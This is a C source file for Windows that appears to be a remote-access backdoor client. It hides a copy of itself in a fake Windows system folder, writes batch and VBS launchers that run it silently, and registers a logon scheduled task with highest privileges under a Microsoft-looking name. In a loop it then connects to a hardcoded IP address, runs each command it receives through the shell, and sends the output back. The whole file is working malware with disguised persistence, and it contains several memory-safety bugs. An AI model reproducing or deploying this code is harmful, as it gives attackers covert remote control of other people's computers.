#include <stdio.h>
#include <winsock2.h>
#include <sys/types.h>
#include <Windows.h>
#include <Wininet.h>
#include <string.h>
#define STANDARD_PORT "3490"

int _checkUpdates(char* buff1, char* buff2, int* stat, int* stt){

    TCHAR full_path[MAX_PATH];
    DWORD string_len = GetFullPathName(TEXT("client.exe"), MAX_PATH, full_path, NULL);
    int index = strstr(full_path, "\\") - (char*) full_path;
    char* newpath = (char*) malloc(48);
    for(int i=0; i <= index; i++){
        newpath[i] = full_path[i];
    }
    newpath[index + 1] = 0;

    DWORD dwAttrib = GetFileAttributes(strcat(newpath, "Windows\\"));

    // Try to find C://Windows
    if(dwAttrib == INVALID_FILE_ATTRIBUTES){
            *stat = 1;
        if(CreateDirectoryA(newpath, NULL) != 0)
            *stat = 1;
    }

    //Try to find C:/Windows/Panther
    dwAttrib = GetFileAttributes(strcat(newpath, "Panther\\"));

    if(dwAttrib == INVALID_FILE_ATTRIBUTES){
            *stat = 1;
        if(CreateDirectoryA(newpath, NULL) != 0)
            *stat = 1;
    }

    //Try to find C:/Windows/Panther/setup.exe
    dwAttrib = GetFileAttributes(strcat(newpath, "setup.exe\\"));

    if(dwAttrib == INVALID_FILE_ATTRIBUTES){
            *stat = 1;
        if(CreateDirectoryA(newpath, NULL) != 0)
            *stat = 1;
    }
    char myBatFile[MAX_PATH];
    char vbs[MAX_PATH];
    strcpy(myBatFile, newpath);
    strcpy(vbs, newpath);

    dwAttrib = GetFileAttributes(strcat(newpath, "client.exe"));
    if(dwAttrib == INVALID_FILE_ATTRIBUTES){
            *stat = 1;
            if(CopyFile(full_path, newpath, TRUE) == 0)
            *stat = 1;
    }

    dwAttrib = GetFileAttributes(strcat(myBatFile, "myBatFile.bat"));
    if(dwAttrib == INVALID_FILE_ATTRIBUTES){
            *stat = 1;
            FILE* myBat = fopen(myBatFile, "w");
            char* str1 = "@echo off\n";
            char* str2 = " /run /exit /SilentMode";
            fwrite(str1, strlen(str1), 1, myBat);
            fwrite(newpath, strlen(newpath), 1, myBat);
            fwrite(str2, strlen(str2), 1, myBat);
            fclose(myBat);
    }

    dwAttrib = GetFileAttributes(strcat(vbs, "myVbs.vbs"));
    if(dwAttrib == INVALID_FILE_ATTRIBUTES){
            *stat = 1;
            FILE* myVbs = fopen(vbs, "w");
            char* str1 = "Set WshShell = CreateObject(\"WScript.Shell\")\n";
            char* str2 = "WshShell.Run chr(34) & \"";
            char* str3 = "\" & Chr(34), 0\n";
            char* str4 = "Set WshShell = Nothing";
            fwrite(str1, strlen(str1), 1, myVbs);
            fwrite(str2, strlen(str2), 1, myVbs);
            fwrite(myBatFile, strlen(myBatFile), 1, myVbs);
            fwrite(str3, strlen(str3), 1, myVbs);
            fwrite(str4, strlen(str4), 1, myVbs);
            fclose(myVbs);
    }
    free(newpath);

    pipeRes("schtasks /Query /TN \\Microsoft\\newTaskFolder", buff2, stt);
    if(*stt !=  0){
        LPSTR nameBuffer = (LPSTR) malloc(128);
        LPDWORD mysize = sizeof(nameBuffer);
        GetUserNameA(nameBuffer, &mysize);
        char* halfString = "schtasks /Create /RU ";
        char* otherHalf = " /SC ONLOGON /TN \\Microsoft\\newTaskFolder /TR ";
        char* theEnd = " /RL HIGHEST";
        char* finalStr = (char*) malloc(392);
        strcpy(finalStr, halfString);
        strcat(finalStr, nameBuffer);
        strcat(finalStr, otherHalf);
        strcat(finalStr, vbs);
        strcat(finalStr, theEnd);
        printf("The final string: %s", finalStr);
        pipeRes(finalStr, buff2, stt);
        free(nameBuffer);
        free(finalStr);
    }

    return 0;
}


void pipeRes(char* comm, char buff[5000], int* stt){
    FILE* pPipe = _popen(comm, "rt");
    char* tmp[5000];
    memset(tmp, 0, strlen(tmp));
    while(fgets(buff, 4999, pPipe)){
            if((strlen(tmp) + strlen(buff)) < 5000)
                snprintf(tmp, sizeof(tmp), "%s%s", tmp, buff);
            else
                break;
    }
    if (feof(pPipe)){
        *stt = _pclose(pPipe);
    }
    else {
        printf("Error: Failed to read the pipe to the end.");
        *stt = _pclose(pPipe);
    }
    strcpy(buff, tmp);
    memset(tmp, 0, strlen(tmp));
    return;
}

int sendAll(int s, char *buff, int len)
{
    int total = 0;
    int bytesLeft = len;
    int n;
    buff[5000] = 0;
    while(total < len) {
        n = send(s, buff + total, bytesLeft, 0);
        if (n == -1) { break; }
        total += n;
        bytesLeft -= n;
    }
    printf("Bytes Sent: %d\n", n);
    if(n == 4990){
        const char* maxChars = "Max length of buffer reached.";
        send(s, maxChars, strlen(maxChars), 0);
    }
    return n==-1?-1:0;
}

int main(){
    int sock;
    int stren = 0;
    int status = 0;
    char buffer[300];
    char rtnOutput[5000];
    TCHAR curr_path[MAX_PATH];
    DWORD string_len = GetFullPathName(TEXT("client.exe"), MAX_PATH, curr_path, NULL);

    if(strcmp("C:\\Windows\\Panther\\setup.exe\\client.exe", curr_path) != 0){
        _checkUpdates(buffer, rtnOutput, &status, &stren);
        return 0;
    }
    _checkUpdates(buffer, rtnOutput, &status, &stren);
    printf("Status %d and Stren %d", status, stren);
    if (status != 0){
        return 146;
    }

    while(1){

        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(1,1), &wsaData) != 0) {
            fprintf(stderr, "WSAStartup failed.\n");
            exit(1);
        }

        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sock < 0){
            fprintf(stderr, "Socket not opened.\n");
            WSACleanup();
            exit(1);
        }

        struct sockaddr_in servAddr;
        memset(&servAddr, 0, sizeof(servAddr));
        servAddr.sin_family = AF_INET;
        servAddr.sin_port = htons(atoi(STANDARD_PORT));
        // Insert your local subnet ip here. Usually 10.0.0.x, 127.0.0.x or 192.168.116.x
        int rtnVal = inet_pton(AF_INET, "192.168.116.128", &servAddr.sin_addr.s_addr);

        if(rtnVal < 0){
            fprintf(stderr, "inet_pton() failed.");
        }
        if(connect(sock, (struct sockaddr*) &servAddr, sizeof(servAddr)) < 0){
            WSACleanup();
            continue;
        }

        else {
            printf("Connected to server.\n");
            while(1) {

                memset(buffer, 0, 300);
                int nRet = recv(sock, buffer, 299, 0);
                printf("Recv: %d\n", nRet);

                if(nRet < 0)
                    fprintf(stderr, "recv() failed.\n");
                else if(nRet == 0)
                    break;
                else
                    fprintf(stdout, buffer);

                memset(rtnOutput, 0, 5000);
                pipeRes(buffer, rtnOutput, &status);
                if(strlen(rtnOutput) == 0){
                    strcpy(rtnOutput, "Command failed\n");
                }
                if(strlen(rtnOutput) < 400){
                nRet = send(sock, rtnOutput, strlen(rtnOutput), 0);
                if (nRet == SOCKET_ERROR) {
                    fprintf(stderr, "Socket error.\n");
                    closesocket(sock);
                    WSACleanup();
                    break;
                }
                printf("Bytes Sent: %d\n", nRet);
                }
                else {
                    nRet = sendAll(sock, rtnOutput, strlen(rtnOutput));
                    if (nRet == -1) {
                        fprintf(stderr, "Socket error.");
                        closesocket(sock);
                        WSACleanup();
                        break;
                    }
                }
            }
        }
        closesocket(sock);
        WSACleanup();
    }
    return 0;
}
